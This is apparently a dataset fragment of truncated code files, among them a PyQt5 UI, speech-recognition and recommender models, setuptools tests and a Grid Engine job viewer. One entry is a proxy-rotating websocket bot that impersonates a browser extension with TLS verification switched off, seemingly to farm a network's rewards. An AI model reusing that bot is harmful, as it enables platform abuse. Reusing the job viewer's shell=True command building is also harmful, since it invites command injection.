{question}\n\n# Solution:\"\"\"\n\nquestion_format = \"\"\"{question}\"\"\"",
    "import asyncio\nimport random\nimport ssl\nimport time\nimport uuid\nimport json\nimport requests\nimport os, base64\nfrom loguru import logger\nfrom fake_useragent import UserAgent\nfrom base64 import b64decode, b64encode\nimport aiohttp\nfrom aiohttp import ClientSession, ClientWebSocketResponse\n\nasync def connect_to_wss(socks5_proxy, user_id):\n    #user_agent = UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome')\n    user_agent = [\n        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",\n        \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",\n        \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36\"\n    ]\n    random_user_agent = random.choice(user_agent)#user_agent.random\n    device_id = str(uuid.uuid3(uuid.NAMESPACE_DNS, socks5_proxy))\n    logger.info(device_id)\n    while True:\n        try:\n            await asyncio.sleep(random.randint(1, 10) / 10)\n            custom_headers = {\n                \"User-Agent\": random_user_agent,\n                \"Origin\": \"chrome-extension://ilehaonighjijnmpnagapkhpcdbhclfg\"\n            }\n            ssl_context = ssl.create_default_context()\n            ssl_context.check_hostname = False\n            ssl_context.verify_mode = ssl.CERT_NONE\n\n            uri = \"wss://proxy2.wynd.network:4650\"\n            \n            # WebSocket connection via proxy using aiohttp\n            connector = aiohttp.TCPConnector(ssl_context=ssl_context)\n            async with ClientSession(connector=connector) as session:\n                async with session.ws_connect(\n                    uri, \n                    headers=custom_headers, \n                    proxy=socks5_proxy,  # Use HTTP proxy for WebSocket connection\n                ) as websocket:\n                \n                    response = await websocket.receive()\n                    message = json.loads(response.data)\n                    logger.info(message)\n\n                    if message[\"action\"] == \"AUTH\":\n                        auth_response = {\n                            \"id\": message[\"id\"],\n                            \"origin_action\": \"AUTH\",\n                            \"result\": {\n                                \"browser_id\": device_id,\n                                \"user_id\": user_id,\n                                \"user_agent\": custom_headers['User-Agent'],\n                                \"timestamp\": int(time.time()),\n                                \"device_type\": \"extension\",\n                                \"version\": \"4.26.2\",\n                                \"extension_id\": \"ilehaonighjijnmpnagapkhpcdbhclfg\"\n                            }\n                        }\n                        logger.debug(auth_response)\n                        await websocket.send_json(auth_response)\n                        \n                        response_auth = await websocket.receive()\n                        message_auth = json.loads(response_auth.data)\n                        logger.info(message_auth)\n                        \n                        if message_auth[\"action\"] == \"HTTP_REQUEST\":\n                            headers = {\n                                \"Content-Type\": \"application/json; charset=utf-8\",\n                                \"User-Agent\": custom_headers['User-Agent']\n                            }\n\n                            async with session.get(message_auth[\"data\"][\"url\"], headers=headers, proxy=socks5_proxy) as response:\n                                result = await response.json()\n                                content = await response.text()\n                                code = result.get('code')\n                                if None == code:\n                                    logger.error(f\"Error send http\")\n                                    logger.error(f\"Status : {response.status}\")\n                                else:\n                                    logger.info(f\"Send http success : {code}\")\n                                    logger.info(f\"Status : {response.status}\")\n                                    response_body = base64.b64encode(content.encode()).decode()\n                                    httpreq_response = {\n                                        \"id\": message_auth[\"id\"],\n                                        \"origin_action\": \"HTTP_REQUEST\",\n                                        \"result\": {\n                                            \"url\": message_auth[\"data\"][\"url\"],\n                                            \"status\": response.status,\n                                            \"status_text\": response.reason,\n                                            \"headers\": dict(response.headers),\n                                            \"body\": response_body\n                                        }\n                                    }\n                                    logger.d",
    "# -*- coding: utf-8 -*-\r\n\r\n# Form implementation generated from reading ui file 'TelefonDefteriGUI.ui'\r\n#\r\n# Created by: PyQt5 UI code generator 5.13.2\r\n#\r\n# WARNING! All changes made in this file will be lost!\r\n\r\n\r\nfrom PyQt5 import QtCore, QtGui, QtWidgets\r\n\r\n\r\nclass Ui_MainWindow(object):\r\n    def setupUi(self, MainWindow):\r\n        MainWindow.setObjectName(\"MainWindow\")\r\n        MainWindow.resize(910, 723)\r\n        self.centralwidget = QtWidgets.QWidget(MainWindow)\r\n        self.centralwidget.setObjectName(\"centralwidget\")\r\n        self.btnKaydet = QtWidgets.QPushButton(self.centralwidget)\r\n        self.btnKaydet.setGeometry(QtCore.QRect(560, 20, 211, 41))\r\n        self.btnKaydet.setObjectName(\"btnKaydet\")\r\n        self.btnSil = QtWidgets.QPushButton(self.centralwidget)\r\n        self.btnSil.setGeometry(QtCore.QRect(560, 70, 211, 41))\r\n        self.btnSil.setObjectName(\"btnSil\")\r\n        self.btnGuncelle = QtWidgets.QPushButton(self.centralwidget)\r\n        self.btnGuncelle.setGeometry(QtCore.QRect(560, 120, 211, 41))\r\n        self.btnGuncelle.setObjectName(\"btnGuncelle\")\r\n        self.btnListele = QtWidgets.QPushButton(self.centralwidget)\r\n        self.btnListele.setGeometry(QtCore.QRect(560, 170, 211, 41))\r\n        self.btnListele.setObjectName(\"btnListele\")\r\n        self.txtID = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtID.setGeometry(QtCore.QRect(220, 20, 311, 41))\r\n        self.txtID.setObjectName(\"txtID\")\r\n        self.txtIsim = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtIsim.setGeometry(QtCore.QRect(220, 70, 311, 41))\r\n        self.txtIsim.setObjectName(\"txtIsim\")\r\n        self.txtSoyisim = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtSoyisim.setGeometry(QtCore.QRect(220, 120, 311, 41))\r\n        self.txtSoyisim.setObjectName(\"txtSoyisim\")\r\n        self.txtSehir = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtSehir.setGeometry(QtCore.QRect(220, 170, 311, 41))\r\n        self.txtSehir.setObjectName(\"txtSehir\")\r\n        self.txtTelefon = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtTelefon.setGeometry(QtCore.QRect(220, 220, 311, 41))\r\n        self.txtTelefon.setObjectName(\"txtTelefon\")\r\n        self.txtEmail = QtWidgets.QLineEdit(self.centralwidget)\r\n        self.txtEmail.setGeometry(QtCore.QRect(220, 270, 311, 41))\r\n        self.txtEmail.setObjectName(\"txtEmail\")\r\n        self.lblID = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblID.setGeometry(QtCore.QRect(10, 20, 201, 41))\r\n        self.lblID.setObjectName(\"lblID\")\r\n        self.lblISIM = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblISIM.setGeometry(QtCore.QRect(10, 70, 201, 41))\r\n        self.lblISIM.setObjectName(\"lblISIM\")\r\n        self.lblSoyisim = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblSoyisim.setGeometry(QtCore.QRect(10, 120, 201, 41))\r\n        self.lblSoyisim.setObjectName(\"lblSoyisim\")\r\n        self.lblSehir = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblSehir.setGeometry(QtCore.QRect(10, 170, 201, 41))\r\n        self.lblSehir.setObjectName(\"lblSehir\")\r\n        self.lblTelefon = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblTelefon.setGeometry(QtCore.QRect(10, 220, 201, 41))\r\n        self.lblTelefon.setObjectName(\"lblTelefon\")\r\n        self.lblEmail = QtWidgets.QLabel(self.centralwidget)\r\n        self.lblEmail.setGeometry(QtCore.QRect(10, 270, 201, 41))\r\n        self.lblEmail.setObjectName(\"lblEmail\")\r\n        self.tblListele = QtWidgets.QTableWidget(self.centralwidget)\r\n        self.tblListele.setGeometry(QtCore.QRect(10, 330, 891, 341))\r\n        self.tblListele.setObjectName(\"tblListele\")\r\n        self.tblListele.setColumnCount(0)\r\n        self.tblListele.setRowCount(0)\r\n        MainWindow.setCentralWidget(self.centralwidget)\r\n        self.menubar = QtWidgets.QMenuBar(MainWindow)\r\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 910, 22))\r\n        self.menubar.setObjectName(\"menubar\")\r\n        MainWindow.setMenuBar(self.menubar)\r\n        self.statusbar = QtWidgets.QStatusBar(MainWindow)\r\n        self.statusbar.setObjectName(\"statusbar\")\r\n        MainWindow.setStatusBar(self.statusbar)\r\n\r\n        self.retranslateUi(MainWindow)\r\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\r\n\r\n    def retranslateUi(self, MainWindow):\r\n        _translate = QtCore.QCoreApplication.translate\r\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"MainWindow\"))\r\n        self.btnKaydet.setText(_translate(\"MainWindow\", \"KAYDET\"))\r\n        self.btnSil.setText(_translate(\"MainWindow\", \"SIL\"))\r\n        self.btnGuncelle.setText(_translate(\"MainWindow\", \"GUNCELLE\"))\r\n        self.btnListele.setText(_translate(\"MainWindow\", \"LISTELE\"))\r\n        self.lblID.setText(_translate(\"MainWindow\", \"ID\"))\r\n        self.lblISIM.setText(_translate(\"MainWindow\", \"ISIM\"))\r\n        self.lblSoyisim.setText(_translate(\"MainWindow\", \"SOYISIM\"))\r\n        self.lblSehir.setText(_translate(\"MainWindow\", \"SEHIR\"))\r\n        self.lblTelefon.setText(_translate(\"MainWi",
    "import logging\nfrom contextlib import contextmanager\nfrom typing import Dict, List, Optional, Tuple, Union\n\nimport torch\nfrom packaging.version import parse as V\nfrom typeguard import check_argument_types\n\nfrom espnet2.asr.ctc import CTC\nfrom espnet2.asr.sactc import BPECTC, SpeakerAwareCTC\nfrom espnet2.asr.decoder.abs_decoder import AbsDecoder\nfrom espnet2.asr.encoder.abs_encoder import AbsEncoder\nfrom espnet2.asr.frontend.abs_frontend import AbsFrontend\nfrom espnet2.asr.postencoder.abs_postencoder import AbsPostEncoder\nfrom espnet2.asr.preencoder.abs_preencoder import AbsPreEncoder\nfrom espnet2.asr.specaug.abs_specaug import AbsSpecAug\nfrom espnet2.asr.transducer.error_calculator import ErrorCalculatorTransducer\nfrom espnet2.asr_transducer.utils import get_transducer_task_io\nfrom espnet2.layers.abs_normalize import AbsNormalize\nfrom espnet2.torch_utils.device_funcs import force_gatherable\nfrom espnet2.train.abs_espnet_model import AbsESPnetModel\nfrom espnet.nets.e2e_asr_common import ErrorCalculator\nfrom espnet.nets.pytorch_backend.nets_utils import th_accuracy\nfrom espnet.nets.pytorch_backend.transformer.add_sos_eos import add_sos_eos\nfrom espnet.nets.pytorch_backend.transformer.label_smoothing_loss import (  # noqa: H301\n    LabelSmoothingLoss,\n)\n\nif V(torch.__version__) >= V(\"1.6.0\"):\n    from torch.cuda.amp import autocast\nelse:\n    # Nothing to do if torch<1.6.0\n    @contextmanager\n    def autocast(enabled=True):\n        yield\n\n\nclass ESPnetASRModel(AbsESPnetModel):\n    \"\"\"CTC-attention hybrid Encoder-Decoder model\"\"\"\n\n    def __init__(\n        self,\n        vocab_size: int,\n        token_list: Union[Tuple[str, ...], List[str]],\n        frontend: Optional[AbsFrontend],\n        specaug: Optional[AbsSpecAug],\n        normalize: Optional[AbsNormalize],\n        preencoder: Optional[AbsPreEncoder],\n        encoder: AbsEncoder,\n        postencoder: Optional[AbsPostEncoder],\n        decoder: AbsDecoder,\n        ctc: Union[CTC, SpeakerAwareCTC, BPECTC],\n        joint_network: Optional[torch.nn.Module],\n        ctc_weight: float = 0.5,\n        interctc_weight: float = 0.0,\n        ignore_id: int = -1,\n        lsm_weight: float = 0.0,\n        length_normalized_loss: bool = False,\n        report_cer: bool = True,\n        report_wer: bool = True,\n        sym_space: str = \"<space>\",\n        sym_blank: str = \"<blank>\",\n        extract_feats_in_collect_stats: bool = True,\n    ):\n        assert check_argument_types()\n        assert 0.0 <= ctc_weight <= 1.0, ctc_weight\n        assert 0.0 <= interctc_weight < 1.0, interctc_weight\n\n        super().__init__()\n        # note that eos is the same as sos (equivalent ID)\n        self.blank_id = 0\n        self.sos = vocab_size - 1\n        self.eos = vocab_size - 1\n        self.vocab_size = vocab_size\n        self.ignore_id = ignore_id\n        self.ctc_weight = ctc_weight\n        self.interctc_weight = interctc_weight\n        self.token_list = token_list.copy()\n\n        self.frontend = frontend\n        self.specaug = specaug\n        self.normalize = normalize\n        self.preencoder = preencoder\n        self.postencoder = postencoder\n        self.encoder = encoder\n\n        if not hasattr(self.encoder, \"interctc_use_conditioning\"):\n            self.encoder.interctc_use_conditioning = False\n        if self.encoder.interctc_use_conditioning:\n            self.encoder.conditioning_layer = torch.nn.Linear(\n                vocab_size, self.encoder.output_size()\n            )\n\n        self.use_transducer_decoder = joint_network is not None\n\n        self.error_calculator = None\n\n        if self.use_transducer_decoder:\n            from warprnnt_pytorch import RNNTLoss\n\n            self.decoder = decoder\n            self.joint_network = joint_network\n\n            self.criterion_transducer = RNNTLoss(\n                blank=self.blank_id,\n                fastemit_lambda=0.0,\n            )\n\n            if report_cer or report_wer:\n                self.error_calculator_trans = ErrorCalculatorTransducer(\n                    decoder,\n                    joint_network,\n                    token_list,\n                    sym_space,\n                    sym_blank,\n                    report_cer=report_cer,\n                    report_wer=report_wer,\n                )\n            else:\n                self.error_calculator_trans = None\n\n                if self.ctc_weight != 0:\n                    self.error_calculator = ErrorCalculator(\n                        token_list, sym_space, sym_blank, report_cer, report_wer\n                    )\n        else:\n            # we set self.decoder = None in the CTC mode since\n            # self.decoder parameters were never used and PyTorch complained\n            # and threw an Exception in the multi-GPU experiment.\n            # thanks Jeff Farris for pointing out the issue.\n            if ctc_weight == 1.0:\n                self.decoder = None\n            else:\n                self.decoder = decoder\n\n            self.criterion_att = LabelSmoothingLoss(\n       ",
    "import http.client\nimport re\nimport urllib.error\nimport urllib.request\nfrom inspect import cleandoc\n\nimport pytest\n\nimport setuptools.package_index\n\nimport distutils.errors\n\n\nclass TestPackageIndex:\n    def test_regex(self):\n        hash_url = 'http://other_url?:action=show_md5&amp;'\n        hash_url += 'digest=0123456789abcdef0123456789abcdef'\n        doc = \"\"\"\n            <a href=\"http://some_url\">Name</a>\n            (<a title=\"MD5 hash\"\n            href=\"{hash_url}\">md5</a>)\n        \"\"\".lstrip().format(**locals())\n        assert setuptools.package_index.PYPI_MD5.match(doc)\n\n    def test_bad_url_bad_port(self):\n        index = setuptools.package_index.PackageIndex()\n        url = 'http://127.0.0.1:0/nonesuch/test_package_index'\n        with pytest.raises(Exception, match=re.escape(url)):\n            v = index.open_url(url)\n            assert isinstance(v, urllib.error.HTTPError)\n\n    def test_bad_url_typo(self):\n        # issue 16\n        # easy_install inquant.contentmirror.plone breaks because of a typo\n        # in its home URL\n        index = setuptools.package_index.PackageIndex(hosts=('www.example.com',))\n\n        url = 'url:%20https://svn.plone.org/svn/collective/inquant.contentmirror.plone/trunk'\n\n        with pytest.raises(Exception, match=re.escape(url)):\n            v = index.open_url(url)\n            assert isinstance(v, urllib.error.HTTPError)\n\n    def test_bad_url_bad_status_line(self):\n        index = setuptools.package_index.PackageIndex(hosts=('www.example.com',))\n\n        def _urlopen(*args):\n            raise http.client.BadStatusLine('line')\n\n        index.opener = _urlopen\n        url = 'http://example.com'\n        with pytest.raises(Exception, match=r'line'):\n            index.open_url(url)\n\n    def test_bad_url_double_scheme(self):\n        \"\"\"\n        A bad URL with a double scheme should raise a DistutilsError.\n        \"\"\"\n        index = setuptools.package_index.PackageIndex(hosts=('www.example.com',))\n\n        # issue 20\n        url = 'http://http://svn.pythonpaste.org/Paste/wphp/trunk'\n        try:\n            index.open_url(url)\n        except distutils.errors.DistutilsError as error:\n            msg = str(error)\n            assert (\n                'nonnumeric port' in msg\n                or 'getaddrinfo failed' in msg\n                or 'Name or service not known' in msg\n            )\n            return\n        raise RuntimeError(\"Did not raise\")\n\n    def test_url_ok(self):\n        index = setuptools.package_index.PackageIndex(hosts=('www.example.com',))\n        url = 'file:///tmp/test_package_index'\n        assert index.url_ok(url, True)\n\n    def test_parse_bdist_wininst(self):\n        parse = setuptools.package_index.parse_bdist_wininst\n\n        actual = parse('reportlab-2.5.win32-py2.4.exe')\n        expected = 'reportlab-2.5', '2.4', 'win32'\n        assert actual == expected\n\n        actual = parse('reportlab-2.5.win32.exe')\n        expected = 'reportlab-2.5', None, 'win32'\n        assert actual == expected\n\n        actual = parse('reportlab-2.5.win-amd64-py2.7.exe')\n        expected = 'reportlab-2.5', '2.7', 'win-amd64'\n        assert actual == expected\n\n        actual = parse('reportlab-2.5.win-amd64.exe')\n        expected = 'reportlab-2.5', None, 'win-amd64'\n        assert actual == expected\n\n    def test__vcs_split_rev_from_url(self):\n        \"\"\"\n        Test the basic usage of _vcs_split_rev_from_url\n        \"\"\"\n        vsrfu = setuptools.package_index.PackageIndex._vcs_split_rev_from_url\n        url, rev = vsrfu('https://example.com/bar@2995')\n        assert url == 'https://example.com/bar'\n        assert rev == '2995'\n\n    def test_local_index(self, tmpdir):\n        \"\"\"\n        local_open should be able to read an index from the file system.\n        \"\"\"\n        index_file = tmpdir / 'index.html'\n        with index_file.open('w') as f:\n            f.write('<div>content</div>')\n        url = 'file:' + urllib.request.pathname2url(str(tmpdir)) + '/'\n        res = setuptools.package_index.local_open(url)\n        assert 'content' in res.read()\n\n    def test_egg_fragment(self):\n        \"\"\"\n        EGG fragments must comply to PEP 440\n        \"\"\"\n        epoch = [\n            '',\n            '1!',\n        ]\n        releases = [\n            '0',\n            '0.0',\n            '0.0.0',\n        ]\n        pre = [\n            'a0',\n            'b0',\n            'rc0',\n        ]\n        post = ['.post0']\n        dev = [\n            '.dev0',\n        ]\n        local = [\n            ('', ''),\n            ('+ubuntu.0', '+ubuntu.0'),\n            ('+ubuntu-0', '+ubuntu.0'),\n            ('+ubuntu_0', '+ubuntu.0'),\n        ]\n        versions = [\n            [''.join([e, r, p, loc]) for loc in locs]\n            for e in epoch\n            for r in releases\n            for p in sum([pre, post, dev], [''])\n            for locs in local\n        ]\n        for v, vc in versions:\n            dists = list(\n                setuptools.package_index.distros_for_url(\n                    'http://exam",
    "import subprocess\nimport click\nimport os\nimport re\nimport datetime as dt\nfrom .show_nodes import parse_qhost_q_j_F\n\ndef get_current_user():\n    \"\"\" \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d \"\"\"\n    return os.getenv(\"USER\")\n\n\ndef execute_command(command):\n    \"\"\" \u6267\u884c\u547d\u4ee4\u5e76\u8fd4\u56de\u8f93\u51fa \"\"\"\n    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)\n    if result.returncode != 0:\n        raise Exception(f\"\u547d\u4ee4\u6267\u884c\u5931\u8d25: {result.stderr}\")\n    return result.stdout\n\n\ndef get_job_info_by_user(user):\n    \"\"\" \u83b7\u53d6\u7528\u6237\u6240\u6709\u4f5c\u4e1a\u7684 job_id \u548c queue \u4fe1\u606f \"\"\"\n    cmd = f\"qstat -u {user}\"\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    \n    job_info = {}\n    for line in result.stdout.splitlines():\n        # \u8df3\u8fc7\u8868\u5934\u548c\u7a7a\u884c\n        if line.startswith(\"job-ID\") or not line.strip():\n            continue\n        \n        # \u63d0\u53d6 job_id \u548c queue \u4fe1\u606f\n        match = re.search(r'(\\d+)\\s+.+\\s+(\\S+@[\\S]+)', line)\n        if match:\n            job_id, queue = match.groups()\n            job_info[job_id] = queue\n            # print(f\"Job ID: {job_id}, Queue: {queue}\")  # \u53ef\u9009: \u8f93\u51fa\u4ee5\u8c03\u8bd5\n    # print(job_info)\n    return job_info\n\n\n\n\ndef get_job_details(job_ids):\n    \"\"\" \u83b7\u53d6\u6307\u5b9a\u4f5c\u4e1aID\u7684\u8be6\u7ec6\u4fe1\u606f \"\"\"\n    job_ids_str = \",\".join(job_ids)\n    command = f\"qstat -j {job_ids_str}\"\n    print(command)\n    output = execute_command(command)\n    return output\n\ndef print_item(item,one_line=False):\n    \"\"\"\n    \u6253\u5370\u6709\u989c\u8272\u7684\u7ed3\u679c\n    \"\"\"\n    if one_line:\n        one_line_fmt = f\"{item['job_num']} {item.get('exec_host')} {item['job_id']} {item['owner']} {item['job_name']} {item['submit_time']} {item['usage']}\"\n        click.secho(one_line_fmt,fg='magenta')\n    else:\n        click.secho(f'[{item[\"job_num\"]}]' + \"=\" * 60)\n        click.secho(f\"Jobinfo:      {item['owner']} {item['job_id']} {item['job_name']}\",fg='yellow')\n        click.secho(f\"Useage:       {item['usage']}\",fg='cyan')\n        click.secho(f\"Submit_time:  {item['submit_time']}\",fg='magenta')\n        click.secho(f\"Directory:        {item['cwd']} {item['shell']}\",fg='green')\n        click.secho(f\"Queue:        {item.get('exec_host')}\",fg='blue')\n\ndef format_qstat_output(output,job_info,detail=False,one_line=False):\n    \"\"\" \u683c\u5f0f\u5316 qstat -j \u8f93\u51fa\u5e76\u6dfb\u52a0\u4e2d\u6587\u5b57\u6bb5\u540d\u79f0 \"\"\"\n    lines = output.splitlines()\n    formatted_output = []\n    job_num = 0\n    if not detail:\n        # \u7cbe\u7b80\u8f93\u51fa\u683c\u5f0f\n        item = {\n            'job_id':'',\n            'owner':'',\n            'job_name':'',\n            'usage':'',\n            'submit_time':'',\n            'cmd':'',\n            'shell':'',\n            'exec_host':'',\n        }\n\n        for line in lines:\n\n            # \u63d0\u53d6\u4f5c\u4e1a\u4fe1\u606f\n            job_id_match = re.search(r'job_number:\\s+(\\d+)', line)\n            owner_re = re.search(r'owner:\\s+(\\S+)', line)\n            job_name_match = re.search(r'job_name:\\s+(\\S+)', line)\n            usage_match = re.search(r'usage\\s+1:\\s+(.+)', line)\n            submit_time_match = re.search(r'submission_time:\\s+(.+)', line)\n            cwd_re = re.search(r'cwd:\\s+(.+)', line)\n            job_args_match = re.search(r\"job_args:.+\\s+(\\S+)\",line)\n\n            if job_id_match:\n                item['job_id'] = job_id_match.group(1) \n            elif owner_re:\n                item['owner'] = owner_re.group(1)\n            elif job_name_match:\n                item['job_name'] = job_name_match.group(1) \n            elif usage_match:\n                item['usage'] = usage_match.group(1) \n            elif submit_time_match:\n                item['submit_time'] = submit_time_match.group(1) \n                if item['submit_time'] != '\u672a\u77e5':\n                    datetime_obj = dt.datetime.strptime(item['submit_time'], \"%a %b %d %H:%M:%S %Y\")\n                    item['submit_time'] = datetime_obj.strftime(\"%Y-%m-%d %H:%M:%S\")\n            \n            elif cwd_re:\n                item['cwd'] =cwd_re.group(1)\n            elif job_args_match:\n                item['shell'] =job_args_match.group(1)\n\n            # \u83b7\u53d6\u4f5c\u4e1a\u6240\u5728\u7684\u961f\u5217\n            if ('=' * 20 in line) and (item.get('job_id')):\n                if item.get('job_id'):\n                    item['exec_host'] = job_info.get(item['job_id'], '\u672a\u627e\u5230\u8282\u70b9')\n                    job_num += 1\n                    item['job_num'] = job_num \n                    print_item(item,one_line=one_line) \n                    \n        item['exec_host'] = job_info.get(item['job_id'], '\u672a\u627e\u5230\u8282\u70b9')\n        job_num += 1\n        item['job_num'] = job_num\n        print_item(item,one_line=one_line) \n        \n    else:\n        # \u6dfb\u52a0\u4e2d\u6587\u5b57\u6bb5\u540d\u79f0\n        field_mapping = {\n            'job_number': '\u4f5c\u4e1a\u7f16\u53f7',\n            # 'exec_file': '\u4f5c\u4e1a\u811a\u672c\u8def\u5f84',\n            'job_name': '\u4f5c\u4e1a\u540d\u79f0',\n            'submission_time': '\u63d0\u4ea4\u65f6\u95f4',\n            'hard resource_list': '\u786c\u8d44\u6e90\u8bf7\u6c42',\n            'usage': '\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5',\n            'owner': '\u63d0\u4ea4\u8005',\n            'uid': '\u7528\u6237ID',\n            'group': '\u7528\u6237\u7ec4',\n            'gid': '\u7ec4ID',\n            # 'sge_o_home': '\u7528\u6237\u4e3b\u76ee\u5f55',\n            # 'sge_o_log_name': '\u65e5\u5fd7\u540d\u79f0',\n            # 'sge_o_path': '\u8def\u5f84',\n            # 'sge_o_shell': 'shell',\n            'sge_o_host': '\u4e3b\u673a',\n            # 'sge_o_workdir': ",
    "# -*- coding: UTF-8 -*-\n# @Author : Zhiyu He\n# @Email  : hezy22@mails.tsinghua.edu.cn\n\n\"\"\" SDIM\nReference: \n\t'Sampling is all you need on modeling long-term user behaviors for CTR prediction.', Cao, et al. , CIKM2022.\nImplementation reference: FuxiCTR\n\thttps://github.com/reczoo/FuxiCTR/blob/main/model_zoo/SDIM/src/SDIM.py\n\"\"\"\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as fn\nimport numpy as np\nimport pandas as pd\n\nfrom models.BaseContextModel import ContextSeqModel, ContextSeqCTRModel\nfrom models.context_seq.ETA import *\nfrom utils.layers import MultiHeadTargetAttention, MLP_Block \n\nclass SDIMBase(ETABase):\n\t@staticmethod\n\tdef parse_model_args_SDIM(parser):\n\t\t'''\n\t\t\tReuse ETA's args. The following args from ETA is not used for SDIM:\n\t\t\t\tretrieval_k. \n\t\t'''\n\t\treturn ETABase.parse_model_args_eta(parser)\n\t\n\tdef _define_params_SDIM(self):\n\t\t# embedding\n\t\tself.embedding_dict = nn.ModuleDict()\n\t\tfor f in self.user_context+self.item_context+self.situation_context:\n\t\t\tself.embedding_dict[f] = nn.Embedding(self.feature_max[f],self.vec_size) if f.endswith('_c') or f.endswith('_id') else\\\n\t\t\t\t\tnn.Linear(1,self.vec_size,bias=False)\n\t\tself.powers_of_two = nn.Parameter(torch.tensor([2.0 ** i for i in range(self.hash_bits)]),requires_grad=False)\n\t\tpre_feature_num=0\n\t\t# short\n\t\tif self.recent_k > 0:\n\t\t\tself.short_attention = nn.ModuleList()\n\t\t\tfor target_field in self.short_target_field:\n\t\t\t\tif type(target_field) == tuple:\n\t\t\t\t\tinput_dim = self.vec_size * len(target_field)\n\t\t\t\t\tpre_feature_num+=len(target_field)\n\t\t\t\telse:\n\t\t\t\t\tinput_dim = self.vec_size\n\t\t\t\t\tpre_feature_num+=1\n\t\t\t\tself.short_attention.append(MultiHeadTargetAttention(\n\t\t\t\t\tinput_dim, self.attention_dim, self.num_heads,\n\t\t\t\t\tself.attention_dropout, self.use_scale, self.use_qkvo))\n\t\t# long\n\t\tif self.history_max > self.recent_k:\n\t\t\tself.random_rotations = nn.ParameterList()\n\t\t\tfor target_field in self.long_target_field:\n\t\t\t\tif type(target_field) == tuple:\n\t\t\t\t\tinput_dim = self.vec_size * len(target_field)\n\t\t\t\t\tpre_feature_num+=len(target_field)\n\t\t\t\telse:\n\t\t\t\t\tinput_dim = self.vec_size\n\t\t\t\t\tpre_feature_num+=1\n\t\t\t\tself.random_rotations.append(nn.Parameter(torch.randn(input_dim,\n\t\t\t\t\t\t\t\t\tself.num_hashes, self.hash_bits), requires_grad=False))\n\t\t# Whether to use output activation\n\t\t# pre_feature_num = len(list(self.short_sequence_field)) + len(list(self.long_sequence_field))\n\t\t# dnn\n\t\tself.dnn = MLP_Block(input_dim = pre_feature_num * self.vec_size,\n\t\t\t\t\t\t\t output_dim=1,\n\t\t\t\t\t\t\t hidden_units=eval(self.dnn_hidden_units),\n\t\t\t\t\t\t\t hidden_activations=self.dnn_activations,\n\t\t\t\t\t\t\t dropout_rates=self.net_dropout,\n\t\t\t\t\t\t\t batch_norm=self.batch_norm)\n\n\tdef _define_init(self, args, corpus):\n\t\tself._define_hyper_params_eta(args, corpus)\n\t\tself._define_params_SDIM()\n\t\tself.apply(self.init_weights)\n\t\n\tdef long_interest_attention(self, feature_emb_dict, mask, feature_emb):\n\t\t# long interest attention\n\t\tfor idx, (target_field, sequence_field) in enumerate(zip(self.long_target_field, \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t self.long_sequence_field)):\n\t\t\ttarget_emb = self.concat_embedding(target_field, feature_emb_dict) # .flatten(start_dim=-2)\n\t\t\tsequence_emb = self.concat_embedding(sequence_field, feature_emb_dict) # .flatten(start_dim=-2)\n\t\t\ttarget_emb_flatten = target_emb.view(-1,target_emb.size(-1))\n\t\t\tsequence_emb_flatten = sequence_emb.unsqueeze(1).repeat(1,target_emb.size(1),1,1).view(\n\t   \t\t\t\t\t-1,sequence_emb.size(1),sequence_emb.size(2))\n\t\t\tlong_interest_emb_flatten = self.lsh_attention(self.random_rotations[idx], \n\t\t\t\t\t\t\t\t\t\t\t\t\ttarget_emb_flatten, sequence_emb_flatten)\n\t\t\tlong_interest_emb = long_interest_emb_flatten.view(target_emb.shape) # batch * item num * embedding\n\t\t\tfeature_emb.append(long_interest_emb)\n\t\treturn feature_emb\n\t\n\tdef forward(self, feed_dict):\n\t\thislens = feed_dict['lengths']\n\t\t# mask = torch.arange(feed_dict['history_item_id'].shape[1], device=self.device)[None, :] < hislens[:, None] # batch size * history length\n\t\tindices = torch.arange(feed_dict['history_item_id'].shape[1]-1, -1, -1, device=feed_dict['history_item_id'].device)[None, :]\n\t\tmask_short = (indices < hislens[:, None]) & (indices <= self.recent_k)\n\t\tmask_long = (indices < hislens[:, None]) & (indices > self.recent_k)\n\t\tfeature_emb_dict = self.get_embeddings_ETA(feed_dict)\n\t\tif self.recent_k>0:\n\t\t\tfeature_emb = self.short_interest_attention(feature_emb_dict, mask_short)\n\t\telse:\n\t\t\tfeature_emb = []\n\t\tif self.history_max > self.recent_k:\n\t\t\tfeature_emb = self.long_interest_attention(feature_emb_dict, mask_long, feature_emb)\n\t\tfeature_emb = torch.cat(feature_emb,dim=-1)\n\t\t# DNN\n\t\tbatch_size, item_num, emb_dim = feature_emb.shape\n\t\tpredictions = self.dnn(feature_emb.view(-1,emb_dim)).view(batch_size, item_num, -1).squeeze(-1)\n\t\treturn {'prediction':predictions}\n\n\n\tdef lsh_attention(self, random_rotations, target_item, history_sequence):\n\t\t\"\"\" References\n\t\tFuxiCTR - https://github.com/reczoo/FuxiCTR/blob/main/model_zoo/SDIM/src/SDIM.py\n\t\t\"\"\"\n\t\tif not self.reuse_hash:\n\t\t\trandom_rotations = torch.ra",
